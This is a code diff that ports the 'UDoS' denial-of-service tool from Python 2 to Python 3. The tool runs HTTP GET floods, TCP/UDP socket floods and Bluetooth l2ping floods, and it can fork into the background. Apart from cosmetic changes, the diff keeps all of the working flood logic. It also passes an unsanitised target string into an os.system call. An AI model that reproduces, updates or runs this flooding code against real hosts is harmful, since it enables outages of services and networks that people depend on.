@@ -21,8 +21,15 @@
 import re
 import socket
 import getopt
-import sys,os,time,random,httplib,urllib
-from urlparse import urlparse
+import sys,os,time,random,urllib
+
+if sys.version_info[0] >= 3:
+    import http.client as httplib
+    from urllib.parse import urlparse
+else:
+    import httplib
+    from urlparse import urlparse
+
 
 
 #################################
@@ -58,7 +65,7 @@ def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         pid = os.fork()
         if pid > 0:
             sys.exit(0)   # Exit first parent.
-    except OSError, e:
+    except OSError as e:
         sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
         sys.exit(1)
 
@@ -72,7 +79,7 @@ def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         pid = os.fork()
         if pid > 0:
             sys.exit(0)   # Exit second parent.
-    except OSError, e:
+    except OSError as e:
         sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
         sys.exit(1)
 
@@ -95,7 +102,7 @@ def http_attack():
     requests_sent = 0
     timeouts = 0
     o = urlparse(target)
-    print "Starting HTTP GET flood on \""+o.netloc+":"+str(port)+o.path+"\"..."
+    print("Starting HTTP GET flood on \""+o.netloc+":"+str(port)+o.path+"\"...")
 
     try:
         while True:
@@ -108,7 +115,7 @@ def http_attack():
                    timeouts = timeouts + 1
 
     except KeyboardInterrupt:
-        print "Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts)
+        print("Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts))
 
 def eth_attack():
     ''' Ethernet/Wireless attack function '''
@@ -132,8 +139,8 @@ def eth_attack():
 
     try:
         sock.connect(addr)
-    except socket.error as (errno, strerror):
-        print "Error: Cannot connect to destination, "+strerror+" (id="+str(errno)+")"
+    except socket.error as e:
+        print("Error: Cannot connect to destination, "+str(e))
         exit(0)
 
     sock.settimeout(None)
@@ -145,7 +152,7 @@ def eth_attack():
                packets_sent=packets_sent+1
            except socket.error:
                if debugMode == True:
-                   print "Reconnecting: ip="+str(target)+", port="+str(port)+", packets_sent="+str(packets_sent) # propably dropped by firewall
+                   print("Reconnecting: ip="+str(target)+", port="+str(port)+", packets_sent="+str(packets_sent)) # propably dropped by firewall
 
                try:
                    sock.close()
@@ -155,7 +162,7 @@ def eth_attack():
                    continue
 
     except KeyboardInterrupt:
-        print "Info: Sent "+str(packets_sent)+" packets."
+        print("Info: Sent "+str(packets_sent)+" packets.")
 
 def bt_attack():
     global target, port
@@ -183,9 +190,13 @@ def bt_attack():
     #except KeyboardInterrupt:
     #    print "Info: Sent "+str(packets_sent)+" packets."
     try:
+        if not os.path.isfile("/usr/bin/l2ping"):
+            print("Cannot find /usr/bin/l2ping, please install l2ping to use this feature.")
+            sys.exit(0)
+
         sto = os.system ("/usr/bin/l2ping -f "+target+" -s "+str(bytes_len))
     except KeyboardInterrupt:
-        exit(0)
+        sys.exit(0)
     
 
 ##########################################
@@ -195,26 +206,26 @@ def bt_attack():
 def printUsage():
     ''' Prints program usage '''
 
-    print "UDoS for GNU/Linux - Universal DoS and DDoS testing tool"
-    print "Supports attacks: TCP/UDP flood, HTTP flood"
-    print ""
-    print "Usage: udos [option] [long GNU option]"
-    print ""
-    print "Valid options:"
-    print "  -h, --help             : display this help"
-    print "  -f, --fork             : fork to background"
-    print "  -d, --debug            : switch to debug log level"
-    print "  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth), HTTP over ethernet"
-    print "  -t, --target           : target adress (bluetooth mac or ip adress over ethernet/wireless)"
-    print "  -p, --port             : destination port"
-    print "  -b, --bytes            : number of bytes to send in one packet"
-    print ""
+    print("UDoS for GNU/Linux - Universal DoS and DDoS testing tool")
+    print("Supports attacks: TCP/UDP flood, HTTP flood")
+    print("")
+    print("Usage: udos [option] [long GNU option]")
+    print("")
+    print("Valid options:")
+    print("  -h, --help             : display this help")
+    print("  -f, --fork             : fork to background")
+    print("  -d, --debug            : switch to debug log level")
+    print("  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth), HTTP over ethernet")
+    print("  -t, --target           : target adress (bluetooth mac or ip adress over ethernet/wireless)")
+    print("  -p, --port             : destination port")
+    print("  -b, --bytes            : number of bytes to send in one packet")
+    print("")
 
 try:
     opts, args = getopt.getopt(sys.argv[1:], 'hcds:b:t:p:b:', ['console','debug','help', 'socket=', 'target=', 'port=', 'bytes='])
-except getopt.error, msg:
-    print msg
-    print 'UDoS for GNU/Linux - Universal DoS and DDoS testing tool'
+except getopt.error as msg:
+    print(msg)
+    print('UDoS for GNU/Linux - Universal DoS and DDoS testing tool')
     sys.exit(2)
 
 # process options
@@ -230,20 +241,20 @@ for o, a in opts:
         target = a
     if o in ('-p', '--port'):
         if debugMode == True:
-            print "Info: Using port "+str(a)
+            print("Info: Using port "+str(a))
         try:
             port = int(a)
         except ValueError:
-            print "Error: Port value is not an integer"
+            print("Error: Port value is not an integer")
             exit(0)
 
     if o in ('-b', '--bytes'):
         if debugMode == True:
-            print "Info: Will be sending "+str(a)+"b packets"
+            print("Info: Will be sending "+str(a)+"b packets")
         try:
             bytes_len = int(a)
         except ValueError:
-            print "Error: Bytes length must be numeratic"
+            print("Error: Bytes length must be numeratic")
             exit(0)
 
     if o in ('-s', '--socket'):
@@ -260,12 +271,12 @@ for o, a in opts:
             useProtocol = "HTTP"
 
         if debugMode == True:
-            print "Info: Socket type is "+useProtocol
+            print("Info: Socket type is "+useProtocol)
 
 if bluetoothMode == False:
     eth_attack()
 elif bluetoothMode == None:
-    print 'UDoS for GNU/Linux - Universal DoS and DDoS testing tool, use --help for usage'
+    print('UDoS for GNU/Linux - Universal DoS and DDoS testing tool, use --help for usage')
 else:
     #import bluetooth
     bt_attack()
